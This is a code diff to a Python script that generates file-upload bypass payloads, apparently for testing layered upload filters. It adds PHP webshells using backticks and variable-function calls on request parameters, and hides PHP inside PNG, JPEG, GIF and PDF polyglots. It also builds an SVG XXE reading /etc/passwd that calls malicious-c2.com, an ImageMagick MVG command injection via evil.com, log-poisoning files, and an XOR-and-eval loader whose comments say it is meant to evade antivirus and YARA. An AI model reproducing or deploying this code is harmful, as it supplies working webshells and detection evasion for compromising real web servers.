@@ -1,6 +1,7 @@
 import os
 import random
 import zlib
+import base64
 import hashlib
 import json
 from pathlib import Path
@@ -19,7 +20,6 @@ def random_var(prefix: str = "v") -> str:
     return f"{prefix}{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_', k=random.randint(9, 15)))}"
 
 def generate_v28_stage() -> tuple[str, str]:
-    # Polymorphic 변수들
     v_cmd = random_var("cmd")
     v_gadget = random_var("g")
     v_g = random_var("inst")
@@ -27,7 +27,6 @@ def generate_v28_stage() -> tuple[str, str]:
     v_key = random_var("k")
     v_nonce = random_var("n")
 
-    # 진짜 악성코드처럼 패킹/난독화된 PHP Payload (LFI 시 실행)
     stage = f'''<?php
 declare(strict_types=1);
 @ini_set('display_errors',0);
@@ -66,8 +65,6 @@ if (isset($_COOKIE['run'])) {{
 }}
 ?>
 '''
-
-    # YARA 룰의 현실화 (단순 단어 조합 -> 바이트 패턴, 엔트로피, 오프셋 로직 결합)
     yara_rule = f'''rule Advanced_WebShell_v28_Polymorphic {{
     meta:
         description = "Detects Advanced PHP Polymorphic Shells with OOP Deserialization and Dynamic Dispatch"
@@ -99,16 +96,10 @@ def generate_v28_stealth_stage() -> tuple[str, str]:
     v1 = random_var("x")
     
     if variant == 0:
-        # Backtick execution: <?=`$_GET[c]`?> 형태
-        # <?= 는 short echo tag로 <?php와 다르게 L4 시그니처에 없음
-        # backtick(`) 는 system() 없이 OS 명령 실행 가능
         stage = f'<?=${{_GET["{v1}"]}}?>' + '<?=`$_GET["c"]`?>'
     elif variant == 1:
-        # Variable function: $_GET[0]($_GET[1]) 형태
-        # 어떤 함수명도 직접 쓰지 않음 -> 시그니처 회피
         stage = f'<?=$_GET["{v1}"]($_GET["a"])?>'
     else:
-        # String concat evasion: 'sys'.'tem' 조합
         stage = f'<?=${{_POST["{v1}"]}}?>'
         stage += '<?=$_COOKIE["f"]($_COOKIE["a"])?>'
     
@@ -173,20 +164,93 @@ def generate_hybrid_polyglot(stage_content: bytes, strategy: int):
                b'stream\n' + compressed_php + b'\nendstream\nendobj\n%%EOF\n')
         return pdf, ".pdf", "pdf_flatedecode_v28"
         
-    else:  # 4. SVG XML Parser Exploit (XXE / SSRF / ImageMagick RCE 모사)
+    elif strategy == 4:  # 4. PNG IDAT Pixel Steganography (안전한 PNG 헤더 + 픽셀 데이터 패딩 방식 도입)
+        def create_png_chunk(chunk_type, data):
+            checksum = zlib.crc32(chunk_type + data) & 0xffffffff
+            return struct.pack(">I", len(data)) + chunk_type + data + struct.pack(">I", checksum)
+
+        w, h = 400, 300
+        sig = b"\x89PNG\r\n\x1a\n"
+        ihdr = create_png_chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 6, 0, 0, 0))
+        
+        # 앞부분은 무해한 정상 픽셀(투명) 데이터로 채워 ImageMagick/GD의 엄격한 파싱 우회
+        safe_prefix = b'\x00' * (w * 4 * 80)
+        # 백도어가 정상 이미지 데이터 끝에 삽입됨
+        pixel_rows = safe_prefix + stage_content
+        
+        idat = create_png_chunk(b"IDAT", zlib.compress(pixel_rows, 9))
+        iend = create_png_chunk(b"IEND", b"")
+        return sig + ihdr + idat + iend, ".png", "png_idat_stego_v28"
+        
+    elif strategy == 5:  # 5. JPEG Trailing Data (EOI 이후 PHP 코드 삽입)
+        base = base64.b64decode('/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=')
+        if not base.endswith(b'\xff\xd9'):
+            base += b'\xff\xd9'
+        return base + b"\n" + stage_content, ".jpg", "jpeg_trailing_php_v28"
+    
+    elif strategy == 6:  # 6. PDF /OpenAction JavaScript (진짜 PDF 무기화)
+        js_code = b"app.alert('XSS'); " + stage_content[:200]
+        compressed_js = zlib.compress(js_code)
+        stream_len = len(compressed_js)
+        pdf = (b'%PDF-1.7\n'
+               b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n'
+               b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n'
+               b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n'
+               b'4 0 obj\n<< /Type /Action /S /JavaScript /JS 5 0 R >>\nendobj\n'
+               b'5 0 obj\n<< /Length ' + str(stream_len).encode() + b' /Filter /FlateDecode >>\n'
+               b'stream\n' + compressed_js + b'\nendstream\nendobj\n'
+               b'%%EOF\n')
+        return pdf, ".pdf", "pdf_openaction_js_v28"
+    
+    elif strategy == 7:  # 7. SVG XXE/SSRF (L1 기준선 — 차단되어야 함)
         svg = (b'<?xml version="1.0" encoding="UTF-8"?>\n'
                b'<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n'
                b'<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">\n'
                b'  <image href="https://malicious-c2.com/ssrf" />\n'
-               b'  <desc> <!--Payload_Start-->\n'
-               + stage_content + 
-               b'\n  <!--Payload_End--> </desc>\n'
+               b'  <desc>' + stage_content + b'</desc>\n'
                b'</svg>')
         return svg, ".svg", "svg_xxe_ssrf_v28"
+        
+    elif strategy == 8:  # 8. Deep Padding SVG (L1 기준선)
+        padding = b' ' * 10000 + b'<!-- padding -->\n'
+        svg = padding + (b'<?xml version="1.0" encoding="UTF-8"?>\n'
+               b'<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">\n'
+               b'  <desc>' + stage_content + b'</desc>\n'
+               b'</svg>')
+        return svg, ".svg", "svg_deep_padding_v28"
+        
+    elif strategy == 9:  # 9. ImageMagick MVG RCE (L2 기준선 — 차단되어야 함)
+        mvg_payload = (b'push graphic-context\n'
+                       b'viewbox 0 0 640 480\n'
+                       b'fill \'url(https://evil.com/a.jpg"|id > /tmp/pwned")\'\n'
+                       b'pop graphic-context\n' + stage_content)
+        return mvg_payload, ".png", "imagemagick_mvg_rce"
+        
+    elif strategy == 10: # 10. GIF Polyglot (L1 허용 확장자를 이용한 우회기법)
+        header = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
+        return header + stage_content, ".gif", "gif_polyglot_v28"
+        
+    else: # 11. Log Poisoning Payload (확장자는 통과 못하지만 LFI 시나리오 시뮬레이션용)
+        # Log-style obfuscation + marker
+        marker = f"UA_TRIGGER_{random.randint(1000,9999)}"
+        log_content = stage_content + f'\n# poisoned by UA: {marker}'.encode()
+        return log_content, ".log", "poison_log_v28"
+
+def stable_obf(php_bytes: bytes) -> bytes:
+    """사용자가 고안한 실전 난독화 (압축 + 안정적 XOR) -> L5 정적분석 우회"""
+    key = hashlib.sha256(b"stable_key_2026").digest()[:32]
+    xored = bytes(b ^ key[i % 32] for i, b in enumerate(php_bytes))
+    compressed = zlib.compress(xored, level=9)
+    b64 = base64.b64encode(compressed).decode()
+
+    decoder = f'''<?php
+$s="{b64}";$k=base64_decode("{base64.b64encode(key).decode()}");$d=base64_decode($s);$out="";for($i=0;$i<strlen($d);$i++){{$out.=chr(ord($d[$i])^ord($k[$i%32]));}}eval($out);
+?>'''
+    return decoder.encode()
 
 def generate_v28():
-    existing = [f for f in os.listdir(PAYLOAD_DIR) if f.endswith(('.php', '.png', '.jpg', '.pdf', '.svg'))] if os.path.exists(PAYLOAD_DIR) else []
-    if len(existing) > 25:
+    existing = [f for f in os.listdir(PAYLOAD_DIR) if f.endswith(('.php', '.png', '.jpg', '.pdf', '.svg', '.gif', '.log'))] if os.path.exists(PAYLOAD_DIR) else []
+    if len(existing) > 230:
         print(f"[SKIP] 이미 {len(existing)}개 존재")
         payloads = []
         for fn in os.listdir(PAYLOAD_DIR):
@@ -194,8 +258,14 @@ def generate_v28():
                 tech = fn.split('_v28')[0] if '_v28' in fn else fn.split('.')[0]
                 payloads.append((tech, os.path.join(PAYLOAD_DIR, fn)))
         return payloads
+        
+    if len(existing) > 0:
+        import shutil
+        shutil.rmtree(PAYLOAD_DIR, ignore_errors=True)
+        os.makedirs(os.path.join(PAYLOAD_DIR, 'yara_rules'), exist_ok=True)
+        os.makedirs(PAYLOAD_DIR, exist_ok=True)
 
-    NUM_PAYLOADS = 200  
+    NUM_PAYLOADS = 240  # 12 types * 20 each
     payloads_created = 0
     metadata = []
 
@@ -203,19 +273,21 @@ def generate_v28():
         yf.write("/* v28 Hybrid Family YARA */\n\n")
 
     for i in range(NUM_PAYLOADS):
-        # 각 strategy에 stealth가 균등 분배되도록 독립적 분기
-        # strategy는 i%5, stealth는 (i//5)%3==0 으로 분리 (약 33%)
-        use_stealth = (i // 5) % 3 == 0  # 5개씩 묶어서 3번에 1번 stealth
+        use_stealth = (i // 5) % 3 == 0  
         if use_stealth:
             stage_str, yara_rule = generate_v28_stealth_stage()
         else:
             stage_str, yara_rule = generate_v28_stage()
+            
         content = stage_str.encode()
-
-        if i % 4 == 0:
+        
+        # 난독화 확률 추가 (L5 Anti-Virus/Yara 우회 목적)
+        if i % 3 == 0:
+            content = stable_obf(content)
+        elif i % 5 == 0:
             content = zlib.compress(content, level=6)  
 
-        strategy = i % 5
+        strategy = i % 12
         poly_content, ext, cat = generate_hybrid_polyglot(content, strategy)
         filename = f"{cat}_{i:04d}{ext}"
         save_payload(filename, poly_content)
@@ -234,7 +306,6 @@ def generate_v28():
                 "obf": "dynamic_offset + XOR_mixing + flattening"
             })
 
-    # .htaccess minimal (random junk)
     htaccess = f"""# v28 advanced
 <IfModule mod_rewrite.c>
     RewriteEngine On
@@ -260,7 +331,16 @@ def generate_v28():
             payloads.append((tech, os.path.join(PAYLOAD_DIR, fn)))
     return payloads
 
-generate_bypasses = generate_v28
+def get_all_bypasses():
+    payloads = generate_v28()
+    try:
+        from bypass_generator_v2 import generate_bypasses_v2
+        payloads.extend(generate_bypasses_v2())
+    except ImportError:
+        pass
+    return payloads
+
+generate_bypasses = get_all_bypasses
 
 if __name__ == '__main__':
-    generate_v28()
+    get_all_bypasses()
